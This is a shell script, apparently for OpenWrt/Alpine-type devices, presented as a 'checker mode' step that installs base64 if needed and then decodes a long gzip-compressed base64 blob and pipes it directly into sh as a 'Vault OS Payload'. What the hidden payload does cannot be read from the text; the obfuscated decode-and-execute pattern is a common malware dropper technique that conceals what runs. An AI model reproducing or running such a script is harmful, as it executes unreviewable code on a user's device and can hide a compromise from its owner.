#!/bin/sh
echo "====================================================="
echo "  FIRST STEP - CHECKER MODE - ACTIVATING...."
echo "====================================================="

if ! command -v base64 >/dev/null 2>&1; then
    echo "📦 Installing decoding dependencies..."
    
    if command -v opkg >/dev/null 2>&1; then
        opkg update >/dev/null 2>&1
        opkg install coreutils-base64 >/dev/null 2>&1
    elif command -v apk >/dev/null 2>&1; then
        apk update >/dev/null 2>&1
        apk add coreutils >/dev/null 2>&1 
    else
        echo "❌ ERROR: No package manager found! Cannot install base64."
        exit 1
    fi
    
    if ! command -v base64 >/dev/null 2>&1; then
         echo "❌ ERROR: Base64 installation failed. Aborting."
         exit 1
    fi
fi

PAYLOAD="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"

echo "🚀 Executing Vault OS Payload..."
echo "$PAYLOAD" | base64 -d | gunzip | sh

exit 0
